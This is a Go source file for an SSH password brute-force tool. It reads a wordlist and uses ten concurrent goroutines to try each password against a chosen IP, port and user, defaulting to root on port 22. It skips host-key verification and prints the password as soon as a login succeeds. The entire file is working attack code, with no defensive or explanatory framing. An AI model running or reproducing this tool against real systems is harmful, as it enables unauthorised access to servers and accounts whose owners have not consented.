package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"strconv"
	"sync"
	"time"

	"github.com/fatih/color"
	"golang.org/x/crypto/ssh"
)

var (
	inittime     = time.Now()
	passwordfile = flag.String("file", "wordlistfile.txt", "dictionary file for attack")
	ip           = flag.String("ip", "192.168.125.100", "indicate the ip address to force")
	port         = flag.Int("port", 22, "indicate port to force")
	user         = flag.String("user", "root", "indicate user to brute force")
	timer        = flag.Duration("timer", 300*time.Millisecond, "set timeout to ssh dial response (ex:300ms), don't set this too low")
)

type resp struct {
	Error error
	mu    sync.Mutex
}

func sshdialer(password string) *resp {
	salida := &resp{}
	config := &ssh.ClientConfig{

		User:            *user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		Timeout:         *timer,
	}
	//Create dial
	_, err := ssh.Dial("tcp", *ip+":"+strconv.Itoa(*port), config)
	if err != nil {
		fmt.Printf("Failed: %s --- %s:%s\n", password,*ip,strconv.Itoa(*port))
	} else {
		end := time.Now()
		d := end.Sub(inittime)
		duration := d.Seconds()
		fmt.Fprintf(color.Output, "\n%s", color.YellowString("##############################"))
		fmt.Fprintf(color.Output, "%s %s", color.RedString("\n[!]Pattern found: "), color.GreenString(password))
		fmt.Fprintf(color.Output, "\n%s", color.YellowString("##############################"))
		fmt.Printf("\nCompleted in %v seconds\n", strconv.FormatFloat(duration, 'g', -1, 64))
	}
	salida.Error = err
	return salida

}

func printUsedValues() {
	fmt.Println("dictionary file:", *passwordfile)
	fmt.Println("target ip:", *ip)
	fmt.Println("port:", *port)
	fmt.Println("user:", *user)
	fmt.Println("timer:", timer)
	fmt.Println("additional args:", flag.Args())	
}

func main() {
	flag.Parse()
	printUsedValues()

	//foundPasswordFile, err := os.Create("found_passwords.txt")
	//if err != nil {
	//	fmt.Println("Error creating found_passwords.txt file:", err)
	//	return
	//}
	//defer foundPasswordFile.Close()

	file, err := os.Open(*passwordfile)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	passwords := make(chan string)
	results := make(chan *resp)
	var wg sync.WaitGroup

	// read password and send channel
	go func() {
		for scanner.Scan() {
			passwords <- scanner.Text()
		}
		close(passwords)
	}()

	// multi go routine for multi processing
	for i := 0; i < 10; i++ { // set go routine's count
		wg.Add(1)
		go func() {
			defer wg.Done()
			for password := range passwords {
				results <- sshdialer(password)
			}
		}()
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	// process the result
	for resp := range results {
		resp.mu.Lock()
		if resp.Error == nil {
			//password := scanner.Text()
			//_, err := foundPasswordFile.WriteString(password + "\n")
			//if err != nil {
			//	fmt.Println("Error writing password to file:", err)
			//}
			resp.mu.Unlock()
			os.Exit(0)
		}
		resp.mu.Unlock()
	}
}
